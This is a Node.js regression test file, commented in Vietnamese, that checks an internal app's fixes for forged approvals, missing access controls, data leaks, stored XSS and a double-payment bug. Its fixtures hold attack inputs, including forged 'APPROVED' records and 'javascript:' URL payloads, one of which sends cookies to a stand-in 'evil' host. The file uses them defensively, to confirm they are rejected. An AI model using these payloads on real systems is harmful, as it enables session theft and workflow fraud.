// server/tests/test-audit-fixes-batch1.js
//
// Regression test cho ĐỢT 1 các lỗ hổng bảo mật đã xác minh bằng đọc code trực tiếp (rà soát tháng
// 8/2026). Mỗi kịch bản dưới đây gắn với ĐÚNG 1 lỗ hổng đã vá, viết sao cho nếu ai đó lỡ hoàn tác bản
// vá thì test FAIL ngay (không phải test "hành vi chung chung"):
//
//   1. carRegs/officeReqs: extraValidate KHÔNG gán cứng status/currentStep/history -> request tự soạn
//      gửi status:"APPROVED" + history giả bỏ qua TOÀN BỘ quy trình duyệt (lib/createValidation.js).
//   2. itPriceDeptWorkflows THIẾU trong ADMIN_ONLY_KEYS -> user thường tự ghi lại luồng duyệt giá IT
//      qua POST /api/data/itPriceDeptWorkflows (routes/data.js).
//   3. canViewItServiceRenewal/filterItServiceRenewalsForUser đã ĐỊNH NGHĨA nhưng THIẾU trong
//      module.exports -> (a) GET /api/data không lọc gì, lộ nguyên danh mục Gia Hạn Dịch Vụ CNTT;
//      (b) routes/download.js import về `undefined` nên MỌI lượt tải file ném TypeError
//      (lib/recordViewScope.js + routes/data.js + routes/download.js).
//   4. Stored XSS: attachment.fileUrl/bannerUrl/cvFileUrl lưu nguyên văn rồi render thành
//      `<a href="${escapeHtml(url)}">` — escapeHtml() KHÔNG vô hiệu hoá scheme "javascript:"
//      (lib/createValidation.js + editInternalPost() ở lib/recordActions.js).
//   5. paymentRequests là collection tài chính DUY NHẤT chưa lọc lại ở GET /api/data.
//   6. assertCanDeletePaymentRequest() chỉ chặn status==='PAID', bỏ lọt đề nghị mới thanh toán MỘT
//      PHẦN -> xoá rồi tạo lại = trả tiền 2 lần (lib/recordActions.js).
//   7. Mọi route mutation của internalPosts trả bản ghi THÔ, bỏ qua
//      sanitizeInternalPostCommentsForUser() mà GET /api/data vẫn dùng -> ai bấm "Thích" 1 bài cũng đọc
//      được bình luận đang chờ kiểm duyệt + metadata cờ vi phạm (routes/records.js).
//
// KHÁC các test khác trong thư mục này: bài này KHÔNG mở trình duyệt Playwright. Lỗ hổng ở đây nằm
// hoàn toàn ở TẦNG SERVER (bộ lọc quyền xem của GET /api/data, gate ADMIN_ONLY_KEYS, response của
// route mutation) — giao diện không tham gia, nên chạy thẳng express router THẬT (routes/data.js,
// routes/records.js) trong tiến trình Node và chỉ giả lập đúng tầng LƯU TRỮ + middleware xác thực,
// đúng tinh thần "mock backend" của testHarness.js (dùng lại createRunner/assert* của nó).
//
// Chạy: node server/tests/test-audit-fixes-batch1.js
const http = require('http');
const path = require('path');

// Cổng 0 = để hệ điều hành tự cấp cổng còn trống (đọc lại qua server.address().port bên dưới). Khác
// các test Playwright trong thư mục này (mỗi file gõ cứng 1 cổng riêng), bài này không cần trình duyệt
// trỏ tới 1 URL biết trước nên không có lý do gì phải gõ cứng — tránh hẳn lỗi EADDRINUSE khi chạy song
// song/chạy lại ngay sau lần trước chưa kịp nhả cổng.
let PORT = 0;

// ===================== 0) Giả lập tầng lưu trữ + xác thực TRƯỚC khi require router =====================
// routes/data.js/routes/records.js destructure các hàm DB ngay lúc require, nên bản giả lập phải nằm
// sẵn trong require.cache TRƯỚC dòng require router bên dưới.
function stubModule(relPath, exportsObj) {
  const full = require.resolve(path.join(__dirname, '..', relPath));
  require.cache[full] = {
    id: full, filename: full, path: path.dirname(full),
    loaded: true, exports: exportsObj, children: [], paths: []
  };
  return exportsObj;
}

// ===================== Seed =====================
const ADMIN = { username: 'admin', name: 'Quản Trị Viên', dept: 'Ban Giám Đốc', perms: { admin: true }, active: true };
const PLAIN_KD = { username: 'plain_kd', name: 'Nhân Viên Kinh Doanh', dept: 'Kinh Doanh', perms: { carCreate: { all: false, depts: [] }, officeCreate: { all: false, depts: [] }, officeBuy: true }, active: true };
const IT1 = { username: 'it1', name: 'Đội Hỗ Trợ IT', dept: 'IT', perms: { itManage: true }, active: true };
const ACCOUNTANT = { username: 'ketoan', name: 'Kế Toán Thanh Toán', dept: 'Tài Chính', perms: { paymentManage: true }, active: true };
const MODERATOR = { username: 'mod1', name: 'Người Kiểm Duyệt Bài', dept: 'Hành Chính', perms: { internalPostApprove: true }, active: true };
const OTHER = { username: 'other', name: 'Người Bình Luận Khác', dept: 'Kinh Doanh', perms: {}, active: true };

const USERS = [ADMIN, PLAIN_KD, IT1, ACCOUNTANT, MODERATOR, OTHER];

// Bảng AppData giả lập (chỉ các key test này đụng tới).
const APP_DATA = {
  users: USERS,
  depts: ['Kinh Doanh', 'IT', 'Tài Chính', 'Hành Chính', 'Ban Giám Đốc'],
  itPriceDeptWorkflows: { 'Kinh Doanh': { workflowId: 'wf-goc', approvers: { 1: ['admin'] } } },
  sensitiveKeywords: []
};

// Bảng dbo.Records giả lập — CHÍNH danh sách key này đóng vai MIGRATED_COLLECTIONS, nên GET /api/data
// chỉ nạp đúng 3 collection cần cho bài test (các collection khác không tồn tại -> router bỏ qua).
const RECORDS = {
  internalPosts: [],
  paymentRequests: [],
  itServiceRenewals: []
};

function resetRecords() {
  RECORDS.internalPosts = [
    {
      id: 9001, type: 'NEWS', status: 'APPROVED', author: MODERATOR.username, authorName: MODERATOR.name,
      dept: 'Hành Chính', title: 'Thông báo nội bộ', content: 'Nội dung bài đăng', publishAt: null,
      likes: [], readBy: [],
      comments: [
        {
          id: 1, username: OTHER.username, name: OTHER.name, content: 'BÌNH LUẬN VI PHẠM CHỜ KIỂM DUYỆT',
          pendingModeration: true, flagged: true, flagCategories: ['XUC_PHAM'], flagTerms: ['tu-khoa-nhay-cam'],
          flagDismissedBy: null, flagDismissedAt: null, likes: []
        },
        {
          id: 2, username: PLAIN_KD.username, name: PLAIN_KD.name, content: 'Bình luận bình thường',
          pendingModeration: false, flagged: false, flagCategories: [], flagTerms: [],
          flagDismissedBy: null, flagDismissedAt: null, likes: []
        }
      ]
    }
  ];
  RECORDS.paymentRequests = [
    {
      id: 7001, dept: 'Kinh Doanh', title: 'Thanh toán hợp đồng bảng hiệu', amount: 200000000,
      sourceModule: 'CONTRACT', sourceId: 5001, sourceCode: 'HD-2026-001', status: 'APPROVED',
      installments: [
        { description: 'Đợt 1', amount: 100000000, dueDate: '', confirmed: true, confirmedBy: 'ketoan', confirmedAt: '01/08/2026' },
        { description: 'Đợt 2', amount: 100000000, dueDate: '', confirmed: false, confirmedBy: null, confirmedAt: null }
      ],
      createdBy: 'ketoan', createdByName: 'Kế Toán Thanh Toán'
    },
    {
      id: 7002, dept: 'IT', title: 'Thanh toán mua máy chủ', amount: 50000000,
      sourceModule: 'MUA_BAN', sourceId: 6001, sourceCode: 'MB-2026-009', status: 'PENDING',
      installments: [
        { description: 'Đợt duy nhất', amount: 50000000, dueDate: '', confirmed: false, confirmedBy: null, confirmedAt: null }
      ],
      createdBy: 'ketoan', createdByName: 'Kế Toán Thanh Toán'
    }
  ];
  RECORDS.itServiceRenewals = [
    { id: 8001, code: 'GH-001', serviceName: 'Chữ ký số', vendor: 'NCC A', cost: 12000000, expiryDate: '2026-12-31', creator: 'it1' },
    { id: 8002, code: 'GH-002', serviceName: 'Tên miền công ty', vendor: 'NCC B', cost: 900000, expiryDate: '2027-01-15', creator: 'it1' }
  ];
}
resetRecords();

// Người dùng "đang đăng nhập" của request kế tiếp — requireAuth giả lập tra lại từ APP_DATA.users
// đúng như bản thật (không tin bất kỳ field nào client gửi).
let CURRENT_USERNAME = ADMIN.username;

const { HttpError } = require('../lib/httpErrors');

stubModule('lib/appData', {
  getAppDataValue: async (key) => (key in APP_DATA ? APP_DATA[key] : null),
  getAppDataValueWithVersion: async (key) => ({ value: APP_DATA[key] ?? null, version: 'v-test' }),
  getAllAppDataWithVersionsCached: async () => ({ data: { ...APP_DATA }, versions: {} }),
  getAllAppData: async () => ({ ...APP_DATA }),
  setAppDataValue: async (key, value) => { APP_DATA[key] = value; },
  setAppDataValueIfVersionMatches: async (key, value) => { APP_DATA[key] = value; return { conflict: false, version: 'v-test-2' }; },
  withLockedAppDataValue: async (key, fn) => { APP_DATA[key] = await fn(APP_DATA[key]); return APP_DATA[key]; }
});

stubModule('lib/recordStore', {
  // Danh sách này thay cho MIGRATED_COLLECTIONS thật — GET /api/data lặp đúng theo nó.
  MIGRATED_COLLECTIONS: new Set(Object.keys(RECORDS)),
  getAllForCollectionCached: async (c) => RECORDS[c] || [],
  getAllForCollection: async (c) => RECORDS[c] || [],
  withLockedRecordForCollection: async (c, id, mutator) => {
    const list = RECORDS[c] || [];
    const idx = list.findIndex(x => x.id === id);
    if (idx === -1) throw new HttpError(404, 'Không tìm thấy hồ sơ');
    const updated = await mutator(list[idx]);
    list[idx] = updated;
    return updated;
  },
  createForCollection: async () => { throw new Error('không dùng trong bài test này'); },
  createForCollectionSerialized: async () => { throw new Error('không dùng trong bài test này'); },
  insertRecord: async () => { throw new Error('không dùng trong bài test này'); },
  withLockedRecordById: async () => { throw new Error('không dùng trong bài test này'); },
  deleteRecordForCollection: async () => { throw new Error('không dùng trong bài test này'); },
  withAppLock: async (key, fn) => fn()
});

stubModule('lib/taskStore', {
  getAllTasksCached: async () => [],
  getAllTasks: async () => [],
  insertTask: async () => { throw new Error('không dùng trong bài test này'); },
  withLockedTaskById: async () => { throw new Error('không dùng trong bài test này'); },
  deleteTaskById: async () => { throw new Error('không dùng trong bài test này'); },
  migrateDirectiveTaskLinks: async () => 0
});

stubModule('lib/auth', {
  // Bản thật re-fetch user từ DB rồi gắn req.freshUser/req.allUsers — giữ nguyên hợp đồng đó ở đây.
  requireAuth: (req, res, next) => {
    const fresh = USERS.find(u => u.username === CURRENT_USERNAME);
    if (!fresh) return res.status(401).json({ error: 'Chưa đăng nhập' });
    req.user = { username: fresh.username, name: fresh.name };
    req.freshUser = fresh;
    req.allUsers = USERS;
    next();
  },
  blockIfMustChangePassword: (req, res, next) => next(),
  hashPassword: async (p) => `hashed:${p}`,
  isBcryptHash: (v) => String(v || '').startsWith('hashed:'),
  validatePin: () => null
});

stubModule('lib/emailCrypto', { encryptSecret: (s) => `enc:${s}` });

// ===================== 1) Require code THẬT (sau khi đã cắm bản giả lập) =====================
const express = require('express');
const { createRunner, assert, assertEqual, assertIncludes } = require('./testHarness');
const recordActions = require('../lib/recordActions');
const recordViewScope = require('../lib/recordViewScope');
const { validateAndPrepareCreate } = require('../lib/createValidation');
const dataRoutes = require('../routes/data');
const recordRoutes = require('../routes/records');

// ===================== 2) Client HTTP nhỏ gọn =====================
function startApp() {
  const app = express();
  app.use(express.json());
  app.use('/api/data', dataRoutes);
  app.use('/api/records', recordRoutes);
  return new Promise((resolve, reject) => {
    const server = http.createServer(app);
    server.on('error', reject);
    server.listen(0, '127.0.0.1', () => { PORT = server.address().port; resolve(server); });
  });
}

async function api(method, urlPath, body, asUser) {
  if (asUser) CURRENT_USERNAME = asUser.username;
  const res = await fetch(`http://127.0.0.1:${PORT}${urlPath}`, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  let payload = null;
  try { payload = await res.json(); } catch (e) { payload = null; }
  return { status: res.status, body: payload };
}

// Gọi thẳng validateAndPrepareCreate() — đúng những gì routes/create.js làm (xem testHarness.js
// dispatcher), không phụ thuộc DB.
function createRecord(moduleKey, payload, user, existing, appData) {
  return validateAndPrepareCreate(moduleKey, payload, user, existing || [], appData || {});
}

function expectThrows(fn, message) {
  try {
    fn();
  } catch (err) {
    return err;
  }
  throw new Error(message || 'Đáng lẽ phải ném lỗi nhưng không ném');
}

async function main() {
  const server = await startApp();
  const run = createRunner();

  try {
    // ===================================================================================
    // Fix 1 — carRegs/officeReqs: bỏ qua quy trình duyệt bằng payload tự soạn
    // ===================================================================================
    await run.run('Fix 1a — carRegs: payload tự soạn status:"APPROVED" + history giả bị server ép về PENDING/bước 1/history rỗng', () => {
      const record = createRecord('carRegs', {
        code: 'XE-2026-001', dept: 'Kinh Doanh', purpose: 'Đi công tác',
        startTime: '2026-09-01T08:00', endTime: '2026-09-01T17:00',
        routePoints: ['Trụ sở', 'Chi nhánh Bình Dương'], km: 40,
        // 3 field TẤN CÔNG — client thật cũng gửi 3 field này nhưng luôn là PENDING/1/[]
        status: 'APPROVED',
        currentStep: 99,
        history: [{ step: 1, action: 'APPROVED', approver: 'Giám Đốc Giả Mạo', username: 'admin' }]
      }, PLAIN_KD);

      assertEqual(record.status, 'PENDING', 'Server PHẢI ép status về PENDING, không được tin status client gửi');
      assertEqual(record.currentStep, 1, 'Server PHẢI ép currentStep về bước 1');
      assertEqual(record.history.length, 0, 'Server PHẢI xoá sạch history giả do client gửi');
      assertEqual(record.creator, PLAIN_KD.username, 'creator vẫn phải lấy từ phiên đăng nhập');
    });

    await run.run('Fix 1b — officeReqs: payload tự soạn status:"APPROVED" + history giả bị server ép về PENDING/bước 1/history rỗng', () => {
      const record = createRecord('officeReqs', {
        code: 'MB-2026-001', dept: 'Kinh Doanh', subType: 'MUA_BAN', title: 'Mua bàn ghế',
        items: [{ name: 'Ghế xoay', qty: 2, unitPrice: 1500000 }],
        status: 'APPROVED',
        currentStep: 5,
        history: [{ step: 1, action: 'APPROVED', approver: 'Giám Đốc Giả Mạo', username: 'admin' }]
      }, PLAIN_KD);

      assertEqual(record.status, 'PENDING', 'Server PHẢI ép status về PENDING cho đề xuất văn phòng');
      assertEqual(record.currentStep, 1, 'Server PHẢI ép currentStep về bước 1');
      assertEqual(record.history.length, 0, 'Server PHẢI xoá sạch history giả do client gửi');
      assertEqual(record.amount, 3000000, 'amount vẫn phải được tính lại từ items (hành vi cũ không được vỡ)');
    });

    // ===================================================================================
    // Fix 2 — itPriceDeptWorkflows phải nằm trong ADMIN_ONLY_KEYS
    // ===================================================================================
    await run.run('Fix 2 — POST /api/data/itPriceDeptWorkflows: user thường bị chặn 403, admin vẫn ghi được', async () => {
      const HIJACK = { 'Kinh Doanh': { workflowId: 'wf-cua-ke-tan-cong', approvers: { 1: ['plain_kd'] } } };

      const denied = await api('POST', '/api/data/itPriceDeptWorkflows', HIJACK, PLAIN_KD);
      assertEqual(denied.status, 403, 'User thường KHÔNG được ghi cấu hình luồng duyệt giá IT');
      assertIncludes(denied.body.error, 'Quản Trị Viên', 'Thông báo lỗi phải nêu rõ chỉ Quản Trị Viên mới sửa được');
      assertEqual(APP_DATA.itPriceDeptWorkflows['Kinh Doanh'].workflowId, 'wf-goc',
        'Cấu hình luồng duyệt KHÔNG được thay đổi sau lượt ghi bị từ chối');

      const denied2 = await api('POST', '/api/data/itPriceDeptWorkflows', HIJACK, IT1);
      assertEqual(denied2.status, 403, 'Kể cả itManage (đội Hỗ Trợ IT) cũng KHÔNG được tự ghi cấu hình luồng duyệt — đây là màn Quản Trị');

      const ok = await api('POST', '/api/data/itPriceDeptWorkflows', HIJACK, ADMIN);
      assertEqual(ok.status, 200, 'Admin vẫn phải ghi được như trước (không chặn nhầm)');
      assertEqual(APP_DATA.itPriceDeptWorkflows['Kinh Doanh'].workflowId, 'wf-cua-ke-tan-cong', 'Lượt ghi của admin phải có hiệu lực');
      APP_DATA.itPriceDeptWorkflows = { 'Kinh Doanh': { workflowId: 'wf-goc', approvers: { 1: ['admin'] } } };
    });

    // ===================================================================================
    // Fix 3 — itServiceRenewals: thiếu export -> vừa lộ dữ liệu vừa làm sập route tải file
    // ===================================================================================
    await run.run('Fix 3a — lib/recordViewScope.js PHẢI export canViewItServiceRenewal (routes/download.js gọi trực tiếp, thiếu export = TypeError mọi lượt tải file)', () => {
      assertEqual(typeof recordViewScope.canViewItServiceRenewal, 'function',
        'canViewItServiceRenewal phải nằm trong module.exports — routes/download.js import và GỌI nó ở mọi request tải file');
      assertEqual(typeof recordViewScope.filterItServiceRenewalsForUser, 'function',
        'filterItServiceRenewalsForUser phải nằm trong module.exports — routes/data.js cần nó để lọc GET /api/data');
      // Đúng luật phạm vi: quyền PHẲNG itManage/admin, KHÔNG có nhánh "chính chủ luôn xem được".
      assertEqual(recordViewScope.canViewItServiceRenewal(IT1), true, 'itManage phải xem được');
      assertEqual(recordViewScope.canViewItServiceRenewal(ADMIN), true, 'admin phải xem được');
      assertEqual(recordViewScope.canViewItServiceRenewal(PLAIN_KD), false, 'Người không có itManage KHÔNG được xem');
    });

    await run.run('Fix 3b — GET /api/data: người KHÔNG có itManage không còn nhận được itServiceRenewals nào', async () => {
      const asPlain = await api('GET', '/api/data', undefined, PLAIN_KD);
      assertEqual(asPlain.status, 200, 'GET /api/data phải trả 200 (không còn 500)');
      assertEqual(asPlain.body.itServiceRenewals.length, 0,
        'Người không có itManage phải nhận mảng RỖNG — trước đây nhận nguyên danh mục (nhà cung cấp/chi phí/ngày hết hạn)');

      const asIt = await api('GET', '/api/data', undefined, IT1);
      assertEqual(asIt.body.itServiceRenewals.length, 2, 'Đội Hỗ Trợ IT vẫn phải thấy đủ 2 mục (không chặn nhầm người có quyền)');

      const asAdmin = await api('GET', '/api/data', undefined, ADMIN);
      assertEqual(asAdmin.body.itServiceRenewals.length, 2, 'Admin vẫn phải thấy đủ 2 mục');
    });

    // ===================================================================================
    // Fix 4 — Stored XSS qua URL tệp đính kèm/ảnh (scheme "javascript:")
    // ===================================================================================
    await run.run('Fix 4a — internalPosts (TẠO): attachment.fileUrl "javascript:alert(1)" bị từ chối 400', () => {
      const err = expectThrows(() => createRecord('internalPosts', {
        type: 'SHARE', title: 'Bài chia sẻ', content: 'Nội dung',
        postCategory: 'CHIA_SE',
        attachment: { fileName: 'cv.pdf', fileType: 'application/pdf', fileUrl: 'javascript:alert(document.cookie)' }
      }, PLAIN_KD, [], { internalShareCategories: [{ key: 'CHIA_SE', label: 'Chia sẻ' }] }),
      'Payload có attachment.fileUrl scheme javascript: PHẢI bị từ chối');
      assertEqual(err.status, 400, 'Phải trả 400 (lỗi dữ liệu client), không phải âm thầm bỏ qua');
      assertIncludes(err.message, 'không hợp lệ', 'Thông báo lỗi phải nói rõ URL tệp không hợp lệ');
    });

    await run.run('Fix 4b — internalPosts (TẠO): attachment URL /uploads/... hợp lệ và attachment rỗng vẫn qua bình thường', () => {
      const appData = { internalShareCategories: [{ key: 'CHIA_SE', label: 'Chia sẻ' }] };
      const withFile = createRecord('internalPosts', {
        type: 'SHARE', title: 'Bài có tệp', content: 'Nội dung', postCategory: 'CHIA_SE',
        attachment: { fileName: 'a.pdf', fileType: 'application/pdf', fileUrl: '/uploads/1756500000000-a1b2c3d4e5f60718.pdf' }
      }, PLAIN_KD, [], appData);
      assertEqual(withFile.attachment.fileUrl, '/uploads/1756500000000-a1b2c3d4e5f60718.pdf', 'URL do chính hệ thống sinh ra phải đi qua nguyên vẹn');

      const noFile = createRecord('internalPosts', {
        type: 'SHARE', title: 'Bài không tệp', content: 'Nội dung', postCategory: 'CHIA_SE'
      }, PLAIN_KD, [], appData);
      assertEqual(noFile.attachment, undefined, 'Tệp đính kèm là TUỲ CHỌN — không có tệp vẫn phải tạo được');

      const nullFile = createRecord('internalPosts', {
        type: 'SHARE', title: 'Bài tệp null', content: 'Nội dung', postCategory: 'CHIA_SE', attachment: null
      }, PLAIN_KD, [], appData);
      assertEqual(nullFile.attachment, null, 'attachment:null vẫn phải hợp lệ (không ném lỗi)');
    });

    await run.run('Fix 4c — internalPosts (SỬA): editInternalPost() cũng chặn attachment.fileUrl scheme javascript:', () => {
      const draft = {
        id: 9500, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x',
        attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf' }
      };
      const err = expectThrows(() => recordActions.editInternalPost(
        { attachment: { fileName: 'xau.pdf', fileUrl: 'javascript:fetch("//evil/"+document.cookie)' } },
        PLAIN_KD, draft
      ), 'Đường SỬA cũng phải chặn — nếu không thì lỗ hổng chỉ vá được 1 nửa');
      assertEqual(err.status, 400, 'Phải trả 400');
      assertEqual(draft.attachment.fileUrl, '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf',
        'Bản ghi KHÔNG được bị sửa đổi khi payload bị từ chối');

      // Sửa với URL hợp lệ vẫn phải chạy như cũ.
      const okDraft = { id: 9501, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x' };
      recordActions.editInternalPost(
        { attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf' }, draft: true },
        PLAIN_KD, okDraft
      );
      assertEqual(okDraft.attachment.fileUrl, '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf', 'URL hợp lệ vẫn phải lưu được khi sửa');
    });

    await run.run('Fix 4d — recruitmentJobs.bannerUrl / recruitmentReferrals.cvFileUrl cũng chặn scheme javascript:', () => {
      const HR = { username: 'hr1', name: 'Nhân Sự', dept: 'Nhân Sự', perms: { internalRecruitmentCreate: true }, active: true };
      const jobPayload = {
        title: 'Nhân viên bán hàng', description: 'Mô tả', contactInfo: '0900000000',
        bannerUrl: 'javascript:alert(1)'
      };
      const jobErr = expectThrows(() => createRecord('recruitmentJobs', jobPayload, HR, [], { depts: ['Nhân Sự'], stores: [] }),
        'bannerUrl scheme javascript: PHẢI bị từ chối');
      assertEqual(jobErr.status, 400, 'bannerUrl không hợp lệ phải trả 400');

      const job = createRecord('recruitmentJobs', {
        title: 'Nhân viên bán hàng', description: 'Mô tả', contactInfo: '0900000000',
        bannerUrl: '/uploads/1756500000000-cccccccccccccccc.png'
      }, HR, [], { depts: ['Nhân Sự'], stores: [] });
      assertEqual(job.bannerUrl, '/uploads/1756500000000-cccccccccccccccc.png', 'Banner hợp lệ vẫn phải qua');
      job.id = 4001; job.status = 'OPEN';

      const refErr = expectThrows(() => createRecord('recruitmentReferrals', {
        jobId: 4001, candidateName: 'Ứng viên A', candidatePhone: '0911111111',
        cvFileUrl: 'javascript:alert(1)', cvFileName: 'cv.pdf'
      }, PLAIN_KD, [], { recruitmentJobs: [job] }), 'cvFileUrl scheme javascript: PHẢI bị từ chối');
      assertEqual(refErr.status, 400, 'cvFileUrl không hợp lệ phải trả 400');

      const referral = createRecord('recruitmentReferrals', {
        jobId: 4001, candidateName: 'Ứng viên A', candidatePhone: '0911111111',
        cvFileUrl: '/uploads/1756500000000-dddddddddddddddd.pdf', cvFileName: 'cv.pdf'
      }, PLAIN_KD, [], { recruitmentJobs: [job] });
      assertEqual(referral.cvFileUrl, '/uploads/1756500000000-dddddddddddddddd.pdf', 'CV hợp lệ vẫn phải qua');
    });

    // ===================================================================================
    // Fix 5 — paymentRequests phải được lọc theo phòng ban ở GET /api/data
    // ===================================================================================
    await run.run('Fix 5 — GET /api/data: người không có paymentManage chỉ thấy đề nghị thanh toán của ĐÚNG phòng ban mình', async () => {
      const asPlain = await api('GET', '/api/data', undefined, PLAIN_KD);
      const seen = asPlain.body.paymentRequests;
      assertEqual(seen.length, 1, 'Nhân viên Kinh Doanh chỉ được thấy đúng 1 đề nghị của phòng mình (trước đây thấy cả 2)');
      assertEqual(seen[0].dept, 'Kinh Doanh', 'Đề nghị thấy được phải đúng phòng ban của người gọi');
      assert(!seen.some(pr => pr.dept === 'IT'), 'KHÔNG được lộ đề nghị thanh toán của phòng ban khác (số tiền/nhà cung cấp/mã hợp đồng)');

      const asAccountant = await api('GET', '/api/data', undefined, ACCOUNTANT);
      assertEqual(asAccountant.body.paymentRequests.length, 2,
        'Kế toán (paymentManage) vẫn phải thấy TOÀN BỘ đề nghị toàn công ty — không chặn nhầm');

      const asAdmin = await api('GET', '/api/data', undefined, ADMIN);
      assertEqual(asAdmin.body.paymentRequests.length, 2, 'Admin vẫn phải thấy toàn bộ');

      // Kế toán ở phòng Tài Chính không có đề nghị nào mang dept 'Tài Chính' — chứng minh nhánh "thấy
      // hết" của họ đến từ quyền paymentManage chứ không phải từ trùng phòng ban.
      assert(!RECORDS.paymentRequests.some(pr => pr.dept === ACCOUNTANT.dept),
        'Seed phải đảm bảo kế toán KHÔNG cùng phòng ban với đề nghị nào (để khẳng định đúng nhánh quyền được kiểm tra)');
    });

    // ===================================================================================
    // Fix 6 — xoá đề nghị thanh toán đã có đợt được xác nhận chi = thanh toán 2 lần
    // ===================================================================================
    await run.run('Fix 6 — assertCanDeletePaymentRequest(): chặn xoá khi ĐÃ có đợt confirmed dù tổng thể chưa PAID', () => {
      const partiallyPaid = RECORDS.paymentRequests.find(pr => pr.id === 7001);
      assertEqual(partiallyPaid.status, 'APPROVED', 'Bối cảnh: đề nghị mới thanh toán MỘT PHẦN vẫn ở APPROVED, KHÔNG phải PAID');
      assert(partiallyPaid.installments.some(it => it.confirmed === true), 'Bối cảnh: đã có ít nhất 1 đợt được kế toán xác nhận chi');

      const err = expectThrows(() => recordActions.assertCanDeletePaymentRequest(ADMIN, partiallyPaid),
        'Xoá đề nghị đã có đợt được xác nhận chi PHẢI bị chặn (xoá rồi tạo lại sẽ tính lại từ đầu -> trả tiền 2 lần)');
      assertEqual(err.status, 409, 'Phải trả 409 (xung đột trạng thái), cùng khuôn với nhánh PAID sẵn có');
      assertIncludes(err.message, 'xác nhận chi', 'Thông báo phải nêu rõ lý do: đã có đợt được xác nhận chi');

      // Đề nghị CHƯA xác nhận đợt nào thì admin vẫn xoá được như trước (không chặn nhầm).
      const untouched = RECORDS.paymentRequests.find(pr => pr.id === 7002);
      recordActions.assertCanDeletePaymentRequest(ADMIN, untouched);

      // Người không phải admin vẫn bị chặn 403 trước tiên (hành vi cũ không đổi).
      const permErr = expectThrows(() => recordActions.assertCanDeletePaymentRequest(ACCOUNTANT, untouched),
        'Kế toán vẫn KHÔNG được xoá đề nghị thanh toán');
      assertEqual(permErr.status, 403, 'Vẫn phải là 403 cho người không phải admin');
    });

    // ===================================================================================
    // Fix 7 — response của route mutation internalPosts phải đi qua bộ lọc kiểm duyệt
    // ===================================================================================
    await run.run('Fix 7a — POST /api/records/internalPosts/:id/like: người KHÔNG có quyền duyệt không nhận được bình luận chờ kiểm duyệt của người khác', async () => {
      resetRecords();
      const res = await api('POST', '/api/records/internalPosts/9001/like', {}, PLAIN_KD);
      assertEqual(res.status, 200, 'Hành động "Thích" vẫn mở cho mọi người đã đăng nhập');
      const comments = res.body.item.comments;

      assert(!comments.some(c => c.pendingModeration && c.username !== PLAIN_KD.username),
        'Bình luận CHỜ KIỂM DUYỆT của NGƯỜI KHÁC phải bị loại khỏi response — đây chính là dữ liệu bị rò rỉ trước khi vá');
      assert(!comments.some(c => String(c.content || '').includes('BÌNH LUẬN VI PHẠM')),
        'Nội dung bình luận vi phạm tuyệt đối không được xuất hiện trong response cho người không có quyền duyệt');
      comments.forEach(c => {
        assertEqual(c.flagged, undefined, 'Metadata cờ (flagged) phải bị gỡ khỏi response');
        assertEqual(c.flagCategories, undefined, 'Metadata cờ (flagCategories) phải bị gỡ khỏi response');
        assertEqual(c.flagTerms, undefined, 'Metadata cờ (flagTerms) phải bị gỡ khỏi response');
        assertEqual(c.flagDismissedBy, undefined, 'Metadata cờ (flagDismissedBy) phải bị gỡ khỏi response');
      });
      assertEqual(comments.length, 1, 'Chỉ còn lại đúng bình luận công khai');
      assertIncludes(res.body.item.likes, PLAIN_KD.username, 'Hành động "Thích" vẫn phải có hiệu lực thật (không chỉ lọc response)');

      // Bộ nhớ/CSDL vẫn giữ nguyên đủ dữ liệu — chỉ RESPONSE bị lọc, không phải xoá dữ liệu thật.
      const stored = RECORDS.internalPosts.find(p => p.id === 9001);
      assertEqual(stored.comments.length, 2, 'Bản ghi lưu trữ PHẢI giữ nguyên đủ 2 bình luận (bộ lọc chỉ áp cho response)');
      assertEqual(stored.comments[0].flagged, true, 'Bản ghi lưu trữ PHẢI giữ nguyên metadata cờ cho người kiểm duyệt xử lý sau');
    });

    await run.run('Fix 7b — người CÓ quyền internalPostApprove vẫn nhận đủ bình luận + metadata cờ (không lọc nhầm)', async () => {
      resetRecords();
      const res = await api('POST', '/api/records/internalPosts/9001/like', {}, MODERATOR);
      assertEqual(res.status, 200, 'Người kiểm duyệt cũng "Thích" được bình thường');
      const comments = res.body.item.comments;
      assertEqual(comments.length, 2, 'Người kiểm duyệt phải thấy ĐỦ cả bình luận đang chờ kiểm duyệt');
      const flaggedComment = comments.find(c => c.id === 1);
      assertEqual(flaggedComment.flagged, true, 'Người kiểm duyệt vẫn phải nhận được cờ vi phạm để xử lý');
      assertIncludes(flaggedComment.flagCategories, 'XUC_PHAM', 'Người kiểm duyệt vẫn phải nhận được lý do gắn cờ');
    });

    await run.run('Fix 7c — POST .../comment: chính người vừa bình luận vẫn thấy bình luận của mình, nhưng không thấy của người khác đang chờ duyệt', async () => {
      resetRecords();
      APP_DATA.sensitiveKeywords = [];
      const res = await api('POST', '/api/records/internalPosts/9001/comment', { content: 'Bình luận mới của tôi' }, OTHER);
      assertEqual(res.status, 200, 'Bình luận vẫn gửi được bình thường');
      const comments = res.body.item.comments;
      assert(comments.some(c => c.content === 'Bình luận mới của tôi'),
        'Người vừa bình luận PHẢI thấy lại bình luận của chính mình trong response (nếu không giao diện sẽ mất bình luận vừa gửi)');
      comments.forEach(c => {
        assertEqual(c.flagged, undefined, 'Response của route comment cũng phải gỡ sạch metadata cờ cho người không có quyền duyệt');
      });
      // OTHER là tác giả của bình luận chờ kiểm duyệt id=1 -> vẫn được giữ lại (khớp
      // sanitizeInternalPostCommentsForUser: `!c.pendingModeration || c.username === user.username`).
      assert(comments.some(c => c.id === 1),
        'Bình luận chờ kiểm duyệt CỦA CHÍNH NGƯỜI GỌI vẫn phải được giữ lại (họ cần thấy trạng thái bài của mình)');
    });
  } finally {
    server.close();
  }

  run.summary();
}

main().catch((err) => {
  console.error('Lỗi không mong đợi khi chạy test-audit-fixes-batch1.js:', err);
  process.exitCode = 1;
});
